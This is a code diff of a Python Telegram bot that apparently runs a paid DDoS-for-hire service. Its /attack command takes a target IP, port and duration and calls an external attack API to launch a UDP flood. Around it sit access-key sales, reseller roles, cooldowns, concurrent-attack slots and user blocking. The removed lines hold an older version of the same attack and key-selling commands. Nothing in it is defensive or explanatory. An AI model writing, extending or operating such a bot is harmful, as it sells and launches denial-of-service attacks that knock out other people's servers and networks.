+        bot.reply_to(msg, f"⚠️ Command '{command_to_block}' is already blocked!")
+
+# Block user command
+@bot.message_handler(commands=['block'])
+def block_user(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split(maxsplit=2)
+    if len(args) < 2:
+        bot.reply_to(msg, "📝 Usage: /block USER_ID [REASON]\n\nExample: /block 123456789 Spamming attacks")
+        return
+    
+    user_to_block = args[1]
+    reason = args[2] if len(args) > 2 else "No reason provided"
+    
+    if is_user_blocked(user_to_block):
+        bot.reply_to(msg, f"⚠️ User {user_to_block} is already blocked!")
+        return
+    
+    save_blocked_user(user_to_block, uid, reason)
+    
+    # Remove from users list if present
+    if user_to_block in users:
+        users.remove(user_to_block)
+        users_data["users"] = users
+        save_users(users_data)
+    
+    # Remove from resellers list if present
+    if user_to_block in resellers:
+        resellers.remove(user_to_block)
+        users_data["resellers"] = resellers
+        save_users(users_data)
+    
+    bot.reply_to(msg, f"✅ USER BLOCKED!\n\n👤 User: {user_to_block}\n📝 Reason: {reason}\n\nUser can no longer use the bot!")
+    
+    try:
+        bot.send_message(user_to_block, f"🚫 You have been blocked from using this bot!\n\nReason: {reason}\n\nContact owner for more information.")
+    except:
+        pass
+
+# Unblock user command
+@bot.message_handler(commands=['unblock'])
+def unblock_user(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    args = msg.text.split()
+    if len(args) != 2:
+        bot.reply_to(msg, "📝 Usage: /unblock USER_ID\n\nExample: /unblock 123456789")
+        return
+    
+    user_to_unblock = args[1]
+    
+    if not is_user_blocked(user_to_unblock):
+        bot.reply_to(msg, f"⚠️ User {user_to_unblock} is not blocked!")
+        return
+    
+    remove_blocked_user(user_to_unblock)
+    bot.reply_to(msg, f"✅ USER UNBLOCKED!\n\n👤 User: {user_to_unblock}\n\nUser can now use the bot again!")
+    
+    try:
+        bot.send_message(user_to_unblock, "✅ You have been unblocked! You can now use the bot again.")
+    except:
+        pass
+
+# List blocked users command
+@bot.message_handler(commands=['blockedlist'])
+def blocked_list(msg):
+    uid = str(msg.chat.id)
+    
+    if uid not in ADMIN_ID:
+        bot.reply_to(msg, "❌ Owner only!")
+        return
+    
+    blocked_users_list = list(blocked_users_collection.find())
+    
+    if not blocked_users_list:
+        bot.reply_to(msg, "📋 No blocked users found.")
+        return
+    
+    blocked_msg = "🚫 BLOCKED USERS LIST\n\n"
+    for i, user in enumerate(blocked_users_list, 1):
+        blocked_msg += f"{i}. 👤 User: {user['user_id']}\n"
+        blocked_msg += f"   📝 Reason: {user.get('reason', 'No reason')}\n"
+        blocked_msg += f"   👮 Blocked by: {user.get('blocked_by', 'Unknown')}\n"
+        blocked_msg += f"   📅 Date: {datetime.fromtimestamp(user.get('blocked_at', time.time())).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+    
+    bot.reply_to(msg, blocked_msg)
+
+@bot.message_handler(commands=['attack'])
+def attack(msg):
+    uid = str(msg.chat.id)
     
     # Check if user is blocked
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 **You are blocked from using this bot!**", parse_mode='MarkdownV2')
+    if is_user_blocked(uid):
+        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
         return
     
-    # Check approval
-    if not await is_user_approved(user_id):
-        await update.message.reply_text(
-            "❌ **Access Denied!**\n\n"
-            "Your account is not approved or has expired.\n"
-            "Use `/redeem <key>` to activate your access.",
-            parse_mode='MarkdownV2'
-        )
-        return
+    chat_type = msg.chat.type
+    is_group = (chat_type == "group" or chat_type == "supergroup")
     
-    # Check arguments
-    if len(context.args) != 3:
-        await update.message.reply_text(
-            f"❌ **Usage:** `/attack <ip> <port> <duration>`\n\n"
-            f"📝 **Example:** `/attack 192.168.1.1 80 60`\n\n"
-            f"🚫 **Blocked ports:** `{get_blocked_ports_list()}`\n"
-            f"⏱️ **Duration:** 10-300 seconds",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    ip = context.args[0]
-    try:
-        port = int(context.args[1])
-        duration = int(context.args[2])
-    except ValueError:
-        await update.message.reply_text("❌ Port and duration must be numbers.", parse_mode='MarkdownV2')
-        return
-    
-    # Validate port
-    if is_port_blocked(port):
-        await update.message.reply_text(
-            f"❌ **Port {port} is blocked!**\n\n"
-            f"✅ **Allowed ports:** {MIN_PORT}-{MAX_PORT} (except blocked)\n"
-            f"🚫 **Blocked ports:** {get_blocked_ports_list()}",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    if port < MIN_PORT or port > MAX_PORT:
-        await update.message.reply_text(f"❌ Port must be between {MIN_PORT} and {MAX_PORT}", parse_mode='MarkdownV2')
-        return
-    
-    # Validate duration
-    if duration < 10 or duration > 300:
-        await update.message.reply_text("❌ Duration must be between 10 and 300 seconds", parse_mode='MarkdownV2')
-        return
-    
-    # Check concurrent limit
-    if not hasattr(context.bot_data, 'active_attacks'):
-        context.bot_data['active_attacks'] = {}
-    
-    concurrent_limit = db.get_concurrent_limit()
-    active_count = len(context.bot_data['active_attacks'])
-    
-    if active_count >= concurrent_limit:
-        await update.message.reply_text(
-            f"⚠️ **Please wait!**\n\n"
-            f"Maximum `{concurrent_limit}` concurrent attacks allowed.\n"
-            f"Currently: `{active_count}/{concurrent_limit}`\n\n"
-            f"Try again after some time.",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    # Launch attack
-    status_msg = await update.message.reply_text(
-        f"🚀 **Launching attack...**\n\n"
-        f"🎯 Target: `{ip}:{port}`\n"
-        f"⏱️ Duration: `{duration}` seconds\n\n"
-        f"🔄 Please wait...",
-        parse_mode='MarkdownV2'
-    )
-    
-    result = launch_attack(ip, port, duration)
-    
-    if result.get("success") or result.get("status") == "ok" or result.get("message"):
-        end_time = get_current_time() + timedelta(seconds=duration)
-        context.bot_data['active_attacks'][user_id] = {
-            "ip": ip,
-            "port": port,
-            "duration": duration,
-            "end_time": end_time
-        }
-        
-        await status_msg.edit_text(
-            f"✅ **Attack Launched Successfully!**\n\n"
-            f"🎯 Target: `{ip}:{port}`\n"
-            f"⏱️ Duration: `{duration}` seconds\n"
-            f"⏰ Ends at: `{end_time.strftime('%H:%M:%S')}` UTC\n\n"
-            f"📊 Use `/status` to check live progress.",
-            parse_mode='MarkdownV2'
-        )
-        db.log_attack(user_id, ip, port, duration, "success", str(result))
-    else:
-        error_msg = result.get('error') or result.get('message') or 'Unknown error'
-        await status_msg.edit_text(
-            f"❌ **Attack Failed!**\n\n"
-            f"Error: `{error_msg}`",
-            parse_mode='MarkdownV2'
-        )
-        db.log_attack(user_id, ip, port, duration, "failed", str(result))
-
-async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    if not hasattr(context.bot_data, 'active_attacks') or user_id not in context.bot_data['active_attacks']:
-        await update.message.reply_text("📭 **No Active Attacks**\n\nYou don't have any attacks running right now.", parse_mode='MarkdownV2')
-        return
-    
-    attack = context.bot_data['active_attacks'][user_id]
-    now = get_current_time()
-    remaining = max(0, (attack['end_time'] - now).seconds)
-    
-    await update.message.reply_text(
-        f"🎯 **Your Active Attack**\n\n"
-        f"📡 Target: `{attack['ip']}:{attack['port']}`\n"
-        f"⏱️ Remaining: `{remaining}` seconds\n"
-        f"📊 Total Duration: `{attack['duration']}` seconds\n\n"
-        f"💡 Use `/status` for detailed progress.",
-        parse_mode='MarkdownV2'
-    )
-
-async def myinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    user = db.get_user(user_id)
-    
-    if not user:
-        await update.message.reply_text("❌ User not found.", parse_mode='MarkdownV2')
-        return
-    
-    status = "✅ Approved" if user.get("approved") else "❌ Not Approved"
-    expires = user.get("expires_at")
-    expiry_text = "N/A"
-    
-    if expires:
-        expires = make_aware(expires)
-        if expires > get_current_time():
-            days_left = (expires - get_current_time()).days
-            hours_left = (expires - get_current_time()).seconds // 3600
-            expiry_text = f"{expires.strftime('%Y-%m-%d %H:%M:%S')} UTC\n📅 {days_left}d {hours_left}h remaining"
-            status += f" ✅"
-        else:
-            status = "❌ Expired"
-            expiry_text = "Account expired"
-    
-    await update.message.reply_text(
-        f"📋 **Your Account Info**\n\n"
-        f"🆔 User ID: `{user_id}`\n"
-        f"👤 Username: @{escape_markdown(user.get('username', 'N/A'))}\n"
-        f"📊 Status: {status}\n"
-        f"📅 Expires: {expiry_text}\n"
-        f"🎯 Total Attacks: `{user.get('total_attacks', 0)}`\n"
-        f"📅 Joined: `{user.get('created_at').strftime('%Y-%m-%d %H:%M') if user.get('created_at') else 'N/A'}`",
-        parse_mode='MarkdownV2'
-    )
-
-async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    stats = db.get_user_attack_stats(user_id)
-    
-    success_rate = (stats['successful'] / stats['total'] * 100) if stats['total'] > 0 else 0
-    
-    await update.message.reply_text(
-        f"📊 **Your Attack Statistics**\n\n"
-        f"🎯 Total Attacks: `{stats['total']}`\n"
-        f"✅ Successful: `{stats['successful']}`\n"
-        f"❌ Failed: `{stats['failed']}`\n"
-        f"📈 Success Rate: `{success_rate:.1f}%`\n\n"
-        f"💪 Keep going!",
-        parse_mode='MarkdownV2'
-    )
-
-async def blockedports_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    await update.message.reply_text(
-        f"🚫 **Blocked Ports List**\n\n"
-        f"The following ports are **BLOCKED** for security reasons:\n\n"
-        f"`{get_blocked_ports_list()}`\n\n"
-        f"✅ **Allowed ports:** {MIN_PORT}-{MAX_PORT} (except blocked)\n\n"
-        f"📌 Common allowed ports: 80 (HTTP), 443 (HTTPS), 22 (SSH), 3389 (RDP)",
-        parse_mode='MarkdownV2'
-    )
-
-async def user_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check active attack with timer and progress bar"""
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    if not hasattr(context.bot_data, 'active_attacks') or user_id not in context.bot_data['active_attacks']:
-        await update.message.reply_text(
-            "📭 **No Active Attacks**\n\n"
-            "You don't have any attacks running right now.\n\n"
-            "Use `/attack` to start a new attack.",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    attack = context.bot_data['active_attacks'][user_id]
-    now = get_current_time()
-    remaining = (attack['end_time'] - now).seconds
-    
-    if remaining <= 0:
-        await update.message.reply_text("✅ **No Active Attacks**\n\nYour last attack has completed.", parse_mode='MarkdownV2')
-        if user_id in context.bot_data['active_attacks']:
-            del context.bot_data['active_attacks'][user_id]
-        return
-    
-    total_dur = attack['duration']
-    elapsed = total_dur - remaining
-    progress = int(elapsed / total_dur * 20)
-    bar = "█" * progress + "░" * (20 - progress)
-    percent = int(progress * 5)
-    
-    # Format time
-    remaining_min = remaining // 60
-    remaining_sec = remaining % 60
-    elapsed_min = elapsed // 60
-    elapsed_sec = elapsed % 60
-    
-    message = (
-        f"🎯 **Active Attack Status**\n\n"
-        f"📡 Target: `{attack['ip']}:{attack['port']}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"`{bar}`\n"
-        f"📊 Progress: `{percent}%`\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"⏳ Elapsed: `{elapsed_min}m {elapsed_sec}s`\n"
-        f"⏱️ Remaining: `{remaining_min}m {remaining_sec}s`\n"
-        f"🔚 Ends in: `{remaining}` seconds\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"💡 Use `/myattacks` for quick check"
-    )
-    
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
-
-# ==================== BLOCK USER COMMANDS ====================
-@admin_required
-async def block_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("❌ Usage: `/block <user_id>`", parse_mode='MarkdownV2')
-        return
-    
-    try:
-        user_id = int(context.args[0])
-        if user_id in ADMIN_IDS:
-            await update.message.reply_text("❌ Cannot block an admin!", parse_mode='MarkdownV2')
+    if is_group:
+        group_id = str(msg.chat.id)
+        attack_time_limit = get_group_attack_time(group_id)
+        if not attack_time_limit:
+            bot.reply_to(msg, "❌ Group not approved!")
             return
-        
-        if db.block_user(user_id):
-            await update.message.reply_text(f"✅ User `{user_id}` has been blocked from using the bot.", parse_mode='MarkdownV2')
-            try:
-                await context.bot.send_message(user_id, "🚫 **You have been blocked from using this bot!**\n\nContact admin for assistance.", parse_mode='MarkdownV2')
-            except:
-                pass
-        else:
-            await update.message.reply_text(f"❌ User `{user_id}` is already blocked.", parse_mode='MarkdownV2')
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.", parse_mode='MarkdownV2')
-
-@admin_required
-async def unblock_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("❌ Usage: `/unblock <user_id>`", parse_mode='MarkdownV2')
-        return
-    
-    try:
-        user_id = int(context.args[0])
-        if db.unblock_user(user_id):
-            await update.message.reply_text(f"✅ User `{user_id}` has been unblocked.", parse_mode='MarkdownV2')
-            try:
-                await context.bot.send_message(user_id, "✅ **You have been unblocked!**\n\nYou can now use the bot again.", parse_mode='MarkdownV2')
-            except:
-                pass
-        else:
-            await update.message.reply_text(f"❌ User `{user_id}` is not blocked.", parse_mode='MarkdownV2')
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.", parse_mode='MarkdownV2')
-
-@admin_required
-async def allblocks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    blocked_users = db.get_blocked_users()
-    
-    if not blocked_users:
-        await update.message.reply_text("📭 **No blocked users.**", parse_mode='MarkdownV2')
-        return
-    
-    message = "🚫 **Blocked Users**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    for user in blocked_users:
-        message += f"🆔 `{user['user_id']}`\n"
-        message += f"📅 Blocked: `{user['blocked_at'].strftime('%Y-%m-%d %H:%M')}`\n\n"
-    
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
-
-# ==================== HOST BOT COMMANDS ====================
-@admin_required
-async def host_bot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 3:
-        await update.message.reply_text(
-            "❌ **Usage:** `/host <bot_token> <owner_id> <bot_name>`\n\n"
-            "Example: `/host 1234567890:ABCdefGHIjkl 8487946379 MONSTER`\n\n"
-            "📌 The bot will be hosted and can be blocked later.",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    bot_token = context.args[0]
-    try:
-        owner_id = int(context.args[1])
-    except ValueError:
-        await update.message.reply_text("❌ Invalid owner ID.", parse_mode='MarkdownV2')
-        return
-    
-    bot_name = " ".join(context.args[2:])
-    
-    if db.add_hosted_bot(bot_token, owner_id, bot_name, update.effective_user.id):
-        await update.message.reply_text(
-            f"✅ **Hosted Bot Added!**\n\n"
-            f"🔑 Token: `{bot_token[:20]}...`\n"
-            f"👑 Owner: `{owner_id}`\n"
-            f"📛 Name: `{bot_name}`\n\n"
-            f"Use `/allhosts` to see all hosted bots.\n"
-            f"Use `/blockhost` to block a hosted bot.",
-            parse_mode='MarkdownV2'
-        )
     else:
-        await update.message.reply_text("❌ Failed to add hosted bot. It may already exist.", parse_mode='MarkdownV2')
-
-@admin_required
-async def unhost_bot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("❌ Usage: `/unhost <bot_token>`", parse_mode='MarkdownV2')
+        attack_time_limit = 300
+    
+    if uid not in users and uid not in ADMIN_ID and uid not in resellers and not is_group:
+        bot.reply_to(msg, "❌ Unauthorized!")
         return
     
-    bot_token = context.args[0]
-    
-    if db.remove_hosted_bot(bot_token):
-        await update.message.reply_text(f"✅ Hosted bot `{bot_token[:20]}...` has been removed.", parse_mode='MarkdownV2')
-    else:
-        await update.message.reply_text("❌ Hosted bot not found.", parse_mode='MarkdownV2')
-
-@admin_required
-async def blockhost_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("❌ Usage: `/blockhost <bot_token>`", parse_mode='MarkdownV2')
+    if not is_group and uid not in ADMIN_ID and not check_user_expiry(uid):
+        bot.reply_to(msg, "❌ Your access has expired!\nUse /redeem KEY to activate new key.")
         return
     
-    bot_token = context.args[0]
-    
-    if db.block_hosted_bot(bot_token):
-        await update.message.reply_text(f"✅ Hosted bot `{bot_token[:20]}...` has been blocked.", parse_mode='MarkdownV2')
-    else:
-        await update.message.reply_text("❌ Hosted bot not found.", parse_mode='MarkdownV2')
-
-@admin_required
-async def unblockhost_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("❌ Usage: `/unblockhost <bot_token>`", parse_mode='MarkdownV2')
+    total_active = check_total_active_attacks()
+    if total_active >= MAX_CONCURRENT:
+        bot.reply_to(msg, "❌ Both attack slots are full!\nTotal active: " + str(total_active) + "/" + str(MAX_CONCURRENT) + "\nUse /status to check when a slot frees up")
         return
     
-    bot_token = context.args[0]
-    
-    if db.unblock_hosted_bot(bot_token):
-        await update.message.reply_text(f"✅ Hosted bot `{bot_token[:20]}...` has been unblocked.", parse_mode='MarkdownV2')
-    else:
-        await update.message.reply_text("❌ Hosted bot not found.", parse_mode='MarkdownV2')
-
-@admin_required
-async def allhosts_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    hosted_bots = db.get_hosted_bots()
-    
-    if not hosted_bots:
-        await update.message.reply_text("📭 **No hosted bots found.**", parse_mode='MarkdownV2')
-        return
-    
-    message = "🤖 **Hosted Bots**\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    for bot in hosted_bots:
-        status = "🔴 BLOCKED" if bot.get("is_blocked", False) else "🟢 ACTIVE"
-        message += f"🔑 `{bot['bot_token'][:20]}...`\n"
-        message += f"   👑 Owner: `{bot['owner_id']}`\n"
-        message += f"   📛 Name: `{bot.get('bot_name', 'N/A')}`\n"
-        message += f"   {status}\n"
-        message += f"   📅 Added: `{bot['added_at'].strftime('%Y-%m-%d %H:%M')}`\n\n"
-    
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
-
-# ==================== RESELLER COMMANDS ====================
-@reseller_or_admin_required
-async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    if len(context.args) != 1:
-        await update.message.reply_text(
-            "❌ **Usage:** `/genkey <duration>`\n\n"
-            "📌 **Formats:**\n"
-            "• Hours: `24h` (1-168 hours)\n"
-            "• Days: `7d` (1-365 days)\n"
-            "• Weeks: `2w` (1-52 weeks)\n"
-            "• Days only: `30` (1-365 days)\n\n"
-            "**Examples:**\n"
-            "`/genkey 24h` - 24 hours access\n"
-            "`/genkey 7d` - 7 days access\n"
-            "`/genkey 2w` - 2 weeks access\n"
-            "`/genkey 30` - 30 days access",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    duration_str = context.args[0]
-    parsed = parse_duration(duration_str)
-    
-    if not parsed:
-        await update.message.reply_text(
-            "❌ **Invalid duration!**\n\n"
-            "📌 **Valid formats:**\n"
-            "• `1h` to `168h` (hours)\n"
-            "• `1d` to `365d` (days)\n"
-            "• `1w` to `52w` (weeks)\n"
-            "• `1` to `365` (days)",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    days, hours, total_hours, display = parsed
-    
-    key = db.generate_key(user_id, days, hours, display)
-    
-    await update.message.reply_text(
-        f"✅ **Key Generated Successfully!**\n\n"
-        f"🔑 **Key:** `{key}`\n"
-        f"📅 **Duration:** {display}\n"
-        f"⏰ **Total Hours:** {total_hours}h\n\n"
-        f"📤 Share this key with the user to redeem.\n"
-        f"🔐 User will get access immediately after redeeming.",
-        parse_mode='MarkdownV2'
-    )
-
-@reseller_or_admin_required
-async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    is_admin = user_id in ADMIN_IDS
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    if is_admin and len(context.args) > 0 and context.args[0].lower() == "all":
-        keys = db.get_keys()
-        title = "📋 **All Keys (System Wide)**"
-    else:
-        keys = db.get_keys(created_by=user_id)
-        title = "📋 **Your Generated Keys**"
-    
-    if not keys:
-        await update.message.reply_text("📭 No keys found.", parse_mode='MarkdownV2')
-        return
-    
-    used_count = sum(1 for k in keys if k.get("is_used"))
-    unused_count = len(keys) - used_count
-    
-    message = f"{title}\n\n"
-    message += f"📊 Total: {len(keys)} | ✅ Used: {used_count} | 🆕 Unused: {unused_count}\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
-    
-    for key_data in keys[:15]:
-        status = "✅ USED" if key_data.get("is_used") else "🆕 ACTIVE"
-        used_by = f" → Used by: `{key_data.get('used_by')}`" if key_data.get("used_by") else ""
-        message += f"🔑 `{key_data['key']}`\n"
-        message += f"   📅 {key_data.get('duration_display', key_data.get('days', 0))}\n"
-        message += f"   {status}{used_by}\n\n"
-    
-    if len(keys) > 15:
-        message += f"┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n📌 ... and {len(keys)-15} more keys"
-    
-    await update.message.reply_text(message, parse_mode='MarkdownV2')
-
-@reseller_or_admin_required
-async def approveuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    if db.is_user_blocked(user_id):
-        await update.message.reply_text("🚫 You are blocked!", parse_mode='MarkdownV2')
-        return
-    
-    if len(context.args) != 2:
-        await update.message.reply_text(
-            "❌ **Usage:** `/approveuser <user_id> <days>`\n\n"
-            "Example: `/approveuser 123456789 7`\n"
-            "This will approve the user for 7 days.",
-            parse_mode='MarkdownV2'
-        )
-        return
-    
-    try:
-        target_id = int(context.args[0])
-        days = int(context.args[1])
-        
-        if days <= 0 or days > 365:
-            await update.message.reply_text("❌ Days must be between 1 and 365.", parse_mode='MarkdownV2')
+    if uid in cooldown and not is_group:
+        remaining = 30 - (time.time() - cooldown[uid])
+        if remaining > 0:
+            bot.reply_to(msg, "⏳ Wait " + str(int(remaining)) + " seconds!")
             return
-        
-        db.create_user(target_id)
-        if db.approve_user(target_id, days=days):
-            expires_at = get_current_time() + timedelta(days=days)
-            await update.message.reply_text(
-                f"✅ **User Approved!**\n\n"
-                f"🆔 User ID: `{target_id}`\n"
-                f"📅 Duration: `{days}` days\n"
-                f"📅 Expires: `{expires_at.strftime('%Y-%m-%d %H:%M:%S')}` UTC",
-                parse_mode='MarkdownV2'
-            )
-            try:
-                await context.bot.send_message(
-                    target_id,
-                    f"✅ **Account Approved!**\n\n"
-                    f"Your account has been approved for `{days}` days by a reseller.\n\n"
-                    f"Use `/help` to see available commands.",
-                    parse_mode='MarkdownV2'
-                )
-            except:
-                pass
-        else:
-            await update.message.reply_text("❌ Failed to approve user.", parse_mode='MarkdownV2')
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID or days.", parse_mode='MarkdownV2')
-
-# ==================== ADMIN COMMANDS ====================
-@admin_required
-async def admin_approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 2:
-        await update.message.reply_text("❌ Usage: `/approve <user_id> <days>`", parse_mode='MarkdownV2')
-        return
     
-    try:
-        user_id = int(context.args[0])
-        days = int(context.args[1])
-        
-        if days <= 0 or days > 365:
-            await update.message.reply_text("❌ Days must be between 1 and 365.")
+    args = msg.text.split()
+    if is_group:
+        if len(args) != 3:
+            bot.reply_to(msg, "Usage: /attack IP PORT\nExample: /attack 1.1.1.1 443")
             return
-        
-        db.create_user(user_id)
-        if db.approve_user(user_id, days=days):
-            expires_at = get_current_time() + timedelta(days=days)
-            await update.message.reply_text(
-                f"✅ User `{user_id}` approved for `{days}` days!\n"
-                f"📅 Expires: `{expires_at.strftime('%Y-%m-%d %H:%M:%S')}` UTC",
-                parse_mode='MarkdownV2'
-            )
-            try:
-                await context.bot.send_message(
-                    user_id,
-                    f"✅ Your account has been approved for `{days}` days!\n\n"
-                    f"Use `/help` to see commands.",
-                    parse_mode='MarkdownV2'
-                )
-            except:
-                pass
-        else:
-            await update.message.reply_text("❌ Failed to approve user.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid input.")
-
-@admin_required
-async def admin_disapprove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 1:
-        await update.message.reply_text("❌ Usage: `/disapprove <user_id>`", parse_mode='MarkdownV2')
-        return
-    
-    try:
-        user_id = int(context.args[0])
-        if db.disapprove_user(user_id):
-            await update.message.reply_text(f"✅ User `{user_id}` has been disapproved.", parse_mode='MarkdownV2')
-            try:
-                await context.bot.send_message(user_id, "❌ Your access has been revoked by admin.")
-            except:
-                pass
-        else:
-            await update.message.reply_text("❌ User not found.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-
-@admin_required
-async def delkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) != 1:
-        await update.message.reply_text("❌ Usage: `/delkey <key>`", parse_mode='MarkdownV2')
-        return
-    
-    key = context.args[0].upper()
-    if db.delete_key(key):
-        await update.message.reply_text(f"✅ Key `{key}` deleted successfully.", parse_mode='MarkdownV2')
+        ip, port = args[1], args[2]
+        duration = attack_time_limit
     else:
-        await update.message.reply_text(f"❌ Key `{key}` not found.", parse_mode='MarkdownV2')
-
-@admin_required
-async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 1:
-        await update.message.reply_text("❌ Usage: `/addreseller <user_id>`", parse_mode='MarkdownV2')
-        return
+        if len(args) != 4:
+            bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
+            return
+        ip, port, duration = args[1], args[2], args[3]
+        try:
+            duration = int(duration)
+        except:
+            bot.reply_to(msg, "❌ Invalid time!")
+            return
     
     try:
-        user_id = int(context.args[0])
-        if db.add_reseller(user_id, update.effective_user.id):
-            await update.message.reply_text(f"✅ User `{user_id}` is now a reseller.", parse_mode='MarkdownV2')
-            try:
-                await context.bot.send_message(user_id, "✅ You have been promoted to **Reseller**!\n\nUse `/help` to see reseller commands.", parse_mode='MarkdownV2')
-            except:
-                pass
-        else:
-            await update.message.reply_text("❌ User is already a reseller.")
-    except ValueError:
-        await update.message.reply_text("❌ Invalid user ID.")
-
-@admin_required
-async def removereseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if len(context.args) < 1:
-        await update.message.reply_text("❌ Usage: `/removereseller <user_id>`", parse_mode='MarkdownV2')
+        port = int(port)
+        if duration < 10 or duration > attack_time_limit:
+            bot.reply_to(msg, "❌ Duration 10-" + str(attack_time_limit) + " seconds!")
+            return
+    except:
+        bot.reply_to(msg, "❌ Invalid port!")
         return
+    
+    existing_attack = check_active_attack_by_target(ip, port)
+    if existing_attack:
+        remaining = int(existing_attack["finish_time"] - time.time())
+        bot.reply_to(msg, "❌ TARGET UNDER ATTACK!\n\n🎯 " + ip + ":" + str(port) + " already being attacked\n👤 By: " + existing_attack['user'] + "\n⏰ Finishes in: " + str(remaining) + "s")
+        return
+    
+    if not is_group:
+        cooldown[uid] = time.time()
+    
+    attack_id = uid + "_" + str(int(time.time()))
+    target_key = ip + ":" + str(port)
+    finish_time = time.time() + duration
+    
+    active_attacks[attack_id] = {
+        "user": uid,
+        "finish_time": finish_time,
+        "ip": ip,
+        "port": port,
+        "target_key": target_key,
+        "start_time": time.time()
+    }
+    
+    new_total = check_total_active_attacks()
+    bot.reply_to(msg, "🔥 ATTACK LAUNCHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n⚡ Method: UDP (Auto)\n📊 Total active slots: " + str(new_total) + "/" + str(MAX_CONCURRENT))
+    
+    def run():
+        try:
+            api_params = {
+                "api_key": API_KEY,
+                "target": ip,
+                "port": port,
+                "time": duration,
+                "concurrent": 1,
+                "method": "udp"
+            }
+            
+            response = requests.get(API_URL, params=api_params, timeout=10)
+            
+            if response.status_code == 200:
+                time.sleep(duration)
+                bot.send_message(msg.chat.id, "✅ ATTACK FINISHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n🔄 Restart your game!")
+            else:
+                bot.send_message(msg.chat.id, "❌ Attack failed!")
+                
+        except Exception as e:
+            bot.send_message(msg.chat.id, "❌ Attack error!")
+        finally:
+            if attack_id in active_attacks:
+                del active_attacks[attack_id]
+    
+    threading.Thread(target=run).start()
+
+@bot.message_handler(commands=['redeem'])
+def redeem(msg):
+    uid = str(msg.chat.id)
+    
+    # Check if user is blocked
+    if is_user_blocked(uid):
+        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
+        return
+    
+    if uid in ADMIN_ID:
+        bot.reply_to(msg, "❌ You are owner, you already have unlimited access!")
